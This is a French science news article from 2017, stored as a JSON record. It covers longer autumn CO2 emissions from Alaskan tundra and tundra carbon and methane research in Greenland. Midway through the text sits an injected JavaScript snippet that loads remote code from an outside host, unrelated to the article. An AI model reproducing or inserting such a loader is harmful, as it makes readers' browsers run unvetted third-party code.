{"title": "La toundra d'Alaska emet de plus en plus de CO2", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-05-11", "content": "Ces dernieres decennies, la production de dioxyde de carbone par la toundra d'Alaska se prolonge bien au-dela de la fin de l'ete. C'est ce que demontrent de recentes mesures. Les temperatures de plus en plus elevees enregistrees en Arctique aux periodes jadis propices aux grands froids maintiennent l'activite des micro-organismes dans le sol. C'est une consequence du  rechauffement climatique  en cours, predite et redoutee : la  toundra  dans le  cercle arctique , tout au moins en Alaska emet du  dioxyde de carbone  (CO 2 ) sur des periodes bien plus longues qu'auparavant. Roisin Commane, specialiste de l' atmosphere  a l'universite d'Harvard, et son equipe ont ainsi constate que dans la region qu'ils ont etudiee, le taux d' emission  de  gaz  carbonique entre octobre et decembre a augmente de 70 % depuis 1975. Cette periode, octobre a decembre, marque l'arrivee de l'hiver et donc, d'ordinaire, le retour du  gel  et de la neige. Mais depuis plusieurs annees, les grands froids sont de plus en plus tardifs, ce qui a pour consequence de prolonger l'activite des  micro-organismes  qui decomposent les vegetaux morts accumules dans le sol depuis des millenaires (les sols regorgent d'assez de  matiere  organique pour doubler le taux de CO 2  dans l'atmosphere, lequel vient de franchir les 410  ppm ). La toundra designe la vegetation circumpolaire. Elle couvre 8 % des terres de la planete, et joue un grand role dans le cycle du carbone. (c) Hannes Grobe, Wikipedia, cc by sa 2.5                               Des emissions de CO 2  qui continuent au debut de l'hiver Les chercheurs sont parvenus a cette conclusion apres avoir analyse trois sources de donnees :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  les mesures spatiales, entre avril et novembre pour les annees 2012, 2013 et 2014 ; les etudes par avion dans le cadre de la mission Carve ( Carbon Arctic Reservoirs Vulnerability Experiment ) de la Nasa ; les donnees collectees au sol depuis une tour a Utqiagvik (anciennement Barrow), en Alaska. Ces informations sur le long terme sont sans egal dans tout l' Arctique . << Dans le passe, le refroidissement des sols prenait environ un mois, mais avec les temperatures plus chaudes ces dernieres annees, il y a des endroits en Alaska ou les sols de la  toundra  mettent maintenant plus de trois mois pour geler completement , commente la principale auteure de ces recherches publiees dans les  Pnas  ( Proceedings of the National Academy of Sciences ).  Nous observons a present que les emissions de dioxyde de  carbone  des sols continuent durant le debut de la periode hivernale >> . Comme son collegue et coauteur Steve Wofsy le souligne, il faudra surveiller d'encore plus pres, et cela meme quand tous ces espaces semblent geles et endormis, pour bien comprendre ce qu'il se passe.  << Les sols de la toundra semblent agir comme un amplificateur du changement climatique. >> Pour en savoir plus La toundra se deregle Article de Delphine Bossy publie le 14/10/2013 La toundra est un puits phenomenal de carbone... Du moins elle l'etait. Aujourd'hui, sa capacite de stockage est serieusement endommagee, en raison de l'augmentation de la temperature : les organismes vivants larguent de plus en plus de CO 2  dans l'atmosphere alors que le mecanisme de capture par  photosynthese  est mis a mal a un certain seuil. La  toundra  renferme au moins deux fois plus de carbone que la totalite de l'atmosphere. Elle caracterise l'immense surface vegetale entourant les poles, et represente plus de 8 % des  terres  emergees de notre planete. Aujourd'hui, la toundra est l'un des principaux  puits de carbone , sa vegetation stockant en effet une grande quantite du compose par la photosynthese. Il se pourrait bien qu'a l'avenir ce puits devienne une source d'emission. Avec le  changement climatique , la vegetation et les organismes vivants pourraient bien emettre plus de carbone, sous forme de dioxyde de carbone ou de methane, qu'ils ne pourraient en stocker. Depuis plus de dix ans maintenant, des chercheurs bases a la  station de recherche Zackenberg  dans le nord du Groenland evaluent le  bilan carbone  de toute la toundra de l' hemisphere nord . Dans une etude publiee dans les  Journal of Geophysical Research , l'equipe menee par Magnus Lund met en evidence que le largage de CO 2  issus des organismes vivants augmente a mesure que la temperature croit. Pour etablir le bilan de  carbone  de la toundra, les scientifiques ont etudie deux criteres : le taux de carbone emis sous forme de CO 2  en respirant, et le taux stocke par les plantes via la  photosynthese . A partir de ces deux criteres, il est possible de determiner si la toundra est plutot une source ou un  puits de carbone . L'etude montre que le rejet annuel de CO 2  du a la respiration animale augmente de facon lineaire avec la temperature. Par ailleurs, la capacite de stockage de carbone liee a la photosynthese diminue a mesure que la temperature grimpe. Il apparait que ce stockage cesse lorsque la temperature depasse 7 degC. La station de recherche Zackenberg, dans le nord du Groenland, a ete creee en 1995. Elle est devenue l'une des meilleures plateformes pour la recherche et la surveillance dans l'Arctique, grace a des programmes de surveillance en cours. Les batiments de Zackenberg appartiennent au gouvernement autonome du Groenland, alors que l'exploitation et la maintenance sont assurees par l'universite d'Aarhus (Danemark). (c) Henrik Spanggaard Munch, universite d'Aarhus                               Le methane au coeur des etudes de la station Zackenberg Ces dernieres annees, ce seuil de temperature a ete atteint a plusieurs reprises, mais ce n'est pas seulement le rejet du  dioxyde de carbone  qui inquiete. La toundra repose sur le  pergelisol , dont la quantite de glace diminue avec l'augmentation de la temperature. L'equipe montre que le rejet de methane est etroitement lie a la quantite d'eau presente dans le milieu. Plus il y a d' eau , plus il y a de methane emis. A contrario, moins il y a d'eau, plus l' oxygene  present sert a la formation du dioxyde de carbone. En somme, les regions qui s'assechent donnent lieu a une augmentation des emissions de CO 2 , et les regions qui s'humidifient entrainent une augmentation des  emissions de methane . Ce gaz a un  effet de serre  20 fois superieur a celui du dioxyde de carbone, mais son cycle est complexe, et est au coeur des recherches de la station Zackenberg. En 2007, l'equipe avait decouvert qu'a l'automne, lorsque la toundra gelait, d'enormes quantites de methane etaient larguees dans l' atmosphere . Ainsi, les emissions annuelles de methane ont du etre doublees dans le calcul du bilan. Aujourd'hui, de plus en plus de stations de mesure sont installees a travers la toundra pour ameliorer la precision de ce bilan. L'equipe de Magnus Lund cherche maintenant a etablir comment le  methane  se forme a l'automne, et si le carbone qu'il utilise est plutot du carbone recent, ou au contraire du carbone stocke dans le sol depuis longtemps. ", "theme": "planete"}